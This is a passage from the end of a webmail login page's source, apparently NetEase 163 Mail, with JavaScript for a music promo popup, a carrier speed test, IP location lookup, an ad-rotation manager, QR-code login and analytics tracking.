			var sHtml = '&#30334;&#19975;&#26354;&#24211;320K&#39640;&#38899;&#36136;&#65292;500&#20301;&#38899;&#20048;&#20154;&#32852;&#21512;&#25512;&#33616;<br/>&#35753;&#24744;&#30340;&#38899;&#20048;&#19990;&#30028;&#27704;&#19981;&#33853;&#20237;&#65292;&#19982;&#28526;&#27969;&#21516;&#27493;&#65281;';
			$id('yunMusicText1').innerHTML = sHtml;
			$id('yunMusicText2').innerHTML = '&#22909;&#38899;&#20048;&#65292;&#24320;&#21551;&#26032;&#38899;&#20048;&#20043;&#26053;&#65292;&#23613;&#22312;<a style="color:#dd0000;" href="' + sLink + '" target="_blank">&nbsp;<img src="http://mimg.127.net/index/163/effects/130523_music.png" alt="&#32593;&#26131;&#20113;&#38899;&#20048;" style="top:2px;position:relative;"/>&nbsp;&#32593;&#26131;&#20113;&#38899;&#20048;</a>&#12290;';
		}
		oMask.style.height = document.documentElement.clientHeight + 'px';
		oMask.style.display = 'block';
		oYunMusic.style.display = 'block';
	}
})(window);


/**
 * &#28155;&#21152;&#21024;&#38500;classname
 * @param  {Object} o     &#20462;&#25913;&#23545;&#35937;dom&#20803;&#32032;
 * @param  {String} sCls  classname
 * @param  {String} sFunc &#20462;&#25913;classname&#26041;&#24335;&#65306;add/remove
 */
function fCls(o, sCls, sFunc){
	var oTar = o;
	var nRes = oTar.className.indexOf(sCls);
	if(sFunc == 'add'){
		if(nRes == -1){
			oTar.className = oTar.className + ' ' + sCls;
		}else{
			return;
		}
	}
	if(sFunc == 'remove'){
		if(nRes != -1){
			var sCls = '\\s' + sCls
			var rCls = new RegExp(sCls, 'g');
			oTar.className = oTar.className.replace(rCls, '');
		}else{
			return;
		}
	}
}

/**
 * &#27979;&#36895;+&#23450;&#20301;&#26381;&#21153;
 */
//&#30005;&#20449;t:0,&#32852;&#36890;c:1,&#25945;&#32946;&#32593;e:2
var oSpdTestPosition = {
	 gz : ['gzt', 'gzc', 'gze']
	,hz : ['hz']
	,bj : ['t', 'c', 'e']
};
var aSpdResult = [-2,-2,-2,'db'],
	aSpdStartTime = [],
	aSpdEndTime = [],
	aSpdTmpTime = [],
	aSpdQueue = ['t','c','e'];
var bSpdAuto = true;
var sLocationInfo = 'failed';
var fSpeedTestPre = function(sArea){
	var nSpdRndPosition = Math.random() * 100;
	// &#40664;&#35748;&#26426;&#29575;
	aSpdQueue = oSpdTestPosition.gz;
	aSpdResult[3] = 'gz';
	if(nSpdRndPosition <= 33){
		aSpdQueue = oSpdTestPosition.hz;
		aSpdResult[3] = 'hz';
	}
	if(nSpdRndPosition >33 && nSpdRndPosition <= 66){
		aSpdQueue = oSpdTestPosition.bj;
		aSpdResult[3] = 'bj';
	}

	if(sArea){
		aSpdQueue = oSpdTestPosition[sArea];
		aSpdResult[3] = sArea;
	}
	try{
		for(i=0;i<aSpdQueue.length;i++){
			var sLoca = aSpdQueue[i];
			fGetScript('http://'+ sLoca +'p.127.net/cte/' + sLoca + 'test?' + (new Date()).getTime());
		}
	}catch(e){
		fNetErrDebug('ErrfSpeedTestPre');
	}
};
var fSpeedTest = function(nCount){
	try{
		var nRnd;
		if(bSpdAuto){
			fNetErrDebug('fSpeedTest' + nCount);
			aSpdStartTime[nCount] = (new Date()).getTime();
			nRnd = aSpdStartTime[nCount];
		}else{
			aSpdStartTimeUser[nCount] = (new Date()).getTime();
			nRnd = aSpdStartTimeUser[nCount];
		}
		var sLoca = aSpdQueue[nCount];
		fGetScript('http://'+ sLoca +'p.127.net/cte/' + sLoca +'p?' + nRnd);
		if(bSpdAuto){
			aSpdResult[nCount] = -1;
		}
	}catch(e){
		fNetErrDebug('ErrfSpeedTest' + nCount);
	}
};
var fSpd = function(nCount){
	try{
		if(bSpdAuto){
			fNetErrDebug('Spd' + nCount);
			aSpdEndTime[nCount] = (new Date()).getTime();
			aSpdResult[nCount] = aSpdEndTime[nCount] - aSpdStartTime[nCount];
		}else{
			aSpdEndTimeUser[nCount] = (new Date()).getTime();
			aSpdResultUser[nCount] = aSpdEndTimeUser[nCount] - aSpdStartTimeUser[nCount];
			var sIdTmp = 'locationTest';
			var oTar = $id(sIdTmp + nCount);
			var nResult = Number(aSpdResultUser[nCount]);
			/*if(nResult < 100){
				oTar.style.color = "green";
			}else if(nResult < 300 && nResult > 100 ){
				oTar.style.color = "#ff7200";
			}else{
				oTar.style.color = "red";
			}*/
			oTar.innerHTML = '<span class="fontWeight">' + nResult + '</span>ms';
		}
	}catch(e){
		fNetErrDebug('ErrSpd' + nCount);
	}
};

//locationDot
var fLocationDot = function(nCount){
	var sId = 'locationDot';
	var oTar = $id(sId + nCount);
	return setInterval(
		function(){
			if(oTar.innerHTML == '...'){
				oTar.innerHTML = '';
			}else{
				oTar.innerHTML += '.';
			}
		},200);
}

//&#27979;&#36895;&#24377;&#26694;
var aLocationDot = [];
var fSelectLoaction = function(sFunc){
	var oDiv = $id('locationTest');
	var oExt = $id('loginExt');
	if(sFunc == 'show'){
		oDiv.style.display = 'block';
		var sIdTmp = 'locationTest';
		for( var i=0 ; i<=2 ; i++){
			$id(sIdTmp + i).innerHTML = '&#27979;&#36895;&#20013;<span id="locationDot'+ i +'"></span>';
			//$id('locationBest' + i).style.display = 'none';
			aLocationDot[i] = fLocationDot(i);
		}
		fSpdUserInit();
		fSpeedTestPre('bj');
		window.oSelectLoaction = setInterval(
			function(){
				var nBest = 4;
				aSpdResultUser[nBest] = 999;
				for( var i=0 ; i<=2 ; i++){
					clearInterval(aLocationDot[i]);
					var sTxt = $id(sIdTmp + i).innerHTML;
					if( sTxt.match('&#27979;&#36895;&#20013;') ){
						$id(sIdTmp + i).style.color = '#999';
						$id(sIdTmp + i).innerHTML = '&#36229;&#26102;';
					}
					if(aSpdResultUser[i] != -1){
						if(aSpdResultUser[nBest] > aSpdResultUser[i]){
							nBest = i;
						}
					}
				}
				if( nBest !=4 ){
					$id('locationTest' + nBest).style.color = '#22ac38';
				}
				clearInterval(oSelectLoaction);
			},1000)
	}else{
		clearInterval(oSelectLoaction);
		for( var i=0 ; i<=2 ; i++){
			clearInterval(aLocationDot[i]);
		}
		oDiv.style.display = 'none';
	}
},
fSpdUserInit = function(){
	bSpdAuto = false;
	window.aSpdResultUser = [-1,-1,-1];
	window.aSpdStartTimeUser = [];
	window.aSpdEndTimeUser = [];
	window.aSpdResult = [-3,-3,-3,'db'];
	var sIdTmp = 'locationTest';
	for( var i=0 ; i<=2 ; i++){
		$id(sIdTmp + i).style.color = '#848585';
	}
},
fLocationChoose = function(sOperator){
	clearInterval(oSelectLoaction);
	for( var i=0 ; i<=2 ; i++){
		clearInterval(aLocationDot[i]);
		$id('locationHref' + i).className = $id('locationHref' + i).className.replace(/\sservSelected/g, '');
	}
	$id('selectLocationTips').style.display = 'none';
	$id('selectLocationTipsDone').style.display = 'inline';
	$id('locationTest').style.display = 'none';
	var oOperators = {
		t : '&#30005;&#20449;',
		c : '&#32852;&#36890;',
		e : '&#25945;&#32946;&#32593;'
	};
	var sTmpSelect = 0;
	for( j in oOperators ){
		if( j == sOperator ){
			$id('locationHref' + sTmpSelect).className += ' servSelected';
			break;
		}
		sTmpSelect++;
	}
	$id('selectLocation').innerHTML = oOperators[sOperator];
	sLocationInfo = sOperator;
},
fSetLocation = function(data){
	var tmpData = '';
	var aData = data.split('&');
	for(var i = 0; i < aData.length; i++){
		var aParam = aData[i].split('=');
		if(aParam.length >= 2){
			if(aParam[0] == 'net'){
				tmpData = aParam[1];
				break;
			}
		}
	}
	if(tmpData == ''){
		sLocationInfo = 'err';
	}else{
		sLocationInfo = tmpData;
	}
	//&#20351;&#29992;&#27492;&#26381;&#21153;&#29992;&#25143;&#38400;&#20540;
	var nPct = 100;// 0 - 100
	var rnd = Math.random()*100;
	if(rnd < nPct){
		fNetErrDebug('rnd' + ((rnd + '').split('.'))[0]);
		fSpeedTestPre();
	}else{
		bSpdAuto = false;
	}
};

//net=err debug
function fNetErrDebug(sStep){
	try{
		if(sLocationInfo.match('err') != null){
			var sFlow = '-' + sStep;
			aSpdResult[3] += sFlow;
		}
	}
	catch(e){}
}

window.onload = function(){
	indexLogin.init();
	// fq&#32479;&#35745;
	fFQ();
	//&#21551;&#21160;&#23450;&#20301;&#35775;&#38382;
	fGetScript('http://iplocator.mail.163.com/iplocator?callback=fGetLocator');
	// &#25512;&#24191;&#26356;&#26032;&#21518;&#21488;
	loginExtAD.init();
	// &#26131;&#20449;&#20108;&#32500;&#30721;&#30331;&#24405;
	yixinLogin.init();
};

// &#35774;&#32622;&#20869;&#23481;&#22402;&#30452;&#23621;&#20013;
indexLogin.vericalAlignBody();
fEventListen(window, 'resize', fResize);
fEventListen(window, 'resize', indexLogin.vericalAlignBody);
</script>

<!-- &#20027;&#39064;&#22270;&#24037;&#20855; -->
<script type="text/javascript" src="http://mimg.127.net/index/lib/scripts/config.js"></script>
<script type="text/javascript">
var gAdManager={conditionGroup:null,childrenMaterialMap:{},allMaterials:[],init:function(){var aConditions=gAdConf.conf_c;var o={};for(var i=0;i<aConditions.length;
i++){var s=aConditions[i].s;if(s){eval("result = ("+s+")();");var sId=aConditions[i].id+"";if(sId in o){o[sId]=o[sId]&&result;}else{o[sId]=result;}}}for(var sId in o){if(o[sId]){this.conditionGroup=sId-0;
return;}}},getPositionId:function(b){if((b-0+"")==(b+"")){return b;}else{for(var a=0;a<gAdConf.conf_p.length;a++){if(gAdConf.conf_p[a].n==b){return gAdConf.conf_p[a].id;
}}}},getAds:function(c){var h=this.getPositionId(c.position);var e=c.condititonGroup||this.conditionGroup;var a=c.domain||"all";var g=[];var f=gAdConf.conf_d;
var d=c.date||new Date();for(var b=0;b<f.length;b++){if(f[b].s<=d&&f[b].e>=d&&f[b].d==a&&f[b].p==h&&f[b].c==e){g.push(f[b]);if(typeof f[b].m!="object"){f[b].m=this.getMaterial(f[b].m);
}}}if(a!="all"&&g.length==0){return this.getAds({position:h,condititonGroup:e,domain:"all"});}return g;},getAd:function(b){var d=Object.prototype.toString.call(b)==="[object Array]"?b:this.getAds(b);
if(d.length>0){var c=Math.ceil(Math.random()*10000)/100;var f=0;for(var a=0;a<d.length;a++){if(!d[a].pct){continue;}var e=d[a].pct-0;f+=e;if(c<f){return d[a];
}}return d[d.length-1];}},getMaterial:function(a){var b=a;if(typeof a=="object"){return this.getAd(a).m;}var d=gAdConf.conf_m;for(var c=0;c<d.length;c++){if(d[c].id==b){return d[c];
}}},getChildrenMaterials:function(a){if(this.childrenMaterialMap[a]){return this.childrenMaterialMap[a];}var d=[];var c=gAdConf.conf_m;for(var b=0;b<c.length;
b++){var e=c[b];if(e.parentId&&e.parentId==a){d.push(e);}}return d.length>0?(this.childrenMaterialMap[a]=d):null;},getChildMaterial:function(parent){var aChildren=this.getChildrenMaterials(parent);
if(aChildren){var sType="random";if(aChildren[0].condition){sType="condition";}if(aChildren[0].pct){sType="pct";}if(sType=="random"){return aChildren[Math.floor(Math.random()*aChildren.length)];
}var nTotalPct=0;var r=Math.ceil(Math.random()*10000)/100;for(var i=0;i<aChildren.length;i++){var oChild=aChildren[i];if(sType=="condition"&&oChild.condition){eval("result = ("+oChild.condition+")();");
if(result){return oChild;}}if(sType=="pct"&&oChild.pct){var pct=oChild.pct-0;nTotalPct+=pct;if(r<nTotalPct){return oChild;}}if(i==aChildren.length-1){return oChild;
}}}},getDefaults:function(){var b=gAdConf.conf_m;var c=[];for(var a=0;a<b.length;a++){if(!b[a].parentId&&b[a].defaultShow){c.push(b[a]);}}return c;},getAll:function(d,f){var h=this;
var b,f;if(d.materials){}else{b=this.getAds(d);if(b.length>0){oAd=this.getAd(b);f=oAd.m;}else{this.allMaterials=h.getDefaults();f=this.allMaterials[0];
}}var k=this.getChildMaterial(f.id);var c=this.getChildrenMaterials(f.id);var j=this.allMaterials;var e,a;if(j.length==0){if(b.length>0){for(var g=0;g<b.length;
g++){j.push(b[g].m);}}else{j.push(f);}}j.sort(function(l,i){return l.showOrder-i.showOrder;});if(c){c.sort(function(l,i){return l.showOrder-i.showOrder;
});}for(var g=0;g<j.length;g++){if(f.id==j[g].id){e=g;}}if(c){for(var g=0;g<c.length;g++){if(k.id==c[g].id){a=g;}}}return{materials:j,material:f,childMaterail:k,childrenMaterials:c,getNext:function(){if(e==j.length-1){e=0;
}else{e++;}var i=j[e];return h.getAll(this,i);},getPrev:function(){if(e==0){e=j.length-1;}else{e--;}var i=j[e];return h.getAll(this,i);},getNextChild:function(){if(a==c.length-1){a=0;
}else{a++;}return c[a];},getPrevChild:function(){if(a==0){a=c.length-1;}else{a--;}return c[a];}};}};
</script>

<!-- &#26131;&#20449;&#20108;&#32500;&#30721;&#30331;&#24405; -->
<script type="text/javascript" src="http://mimg.127.net/index/lib/scripts/yxlogin.js"></script>

<!-- &#39044;&#21152;&#36733;&#26497;&#36895;js -->
<iframe src="http://mail.163.com/preload6.htm" style="display:none" id="frmJs6"></iframe>

<!--ssl&#38142;&#25509;&#39044;&#21152;&#36733;-->
<img src="https://ssl.mail.163.com/httpsEnable.gif" width="0" height="0" style="display:block;" alt="https preload"/>
<!-- START NetEase Devilfish 2006 -->
<script src="http://analytics.163.com/ntes.js" type="text/javascript"></script>
<script type="text/javascript">
_ntes_nacc = "163mail";
neteaseTracker();
</script>
<!-- END NetEase Devilfish 2006 -->
<!--&#21453;&#22403;&#22334;-->
<a href="http://uinfo.mail.163.com/cgi-bin/hseed/two.pl"></a>
</body>
</html>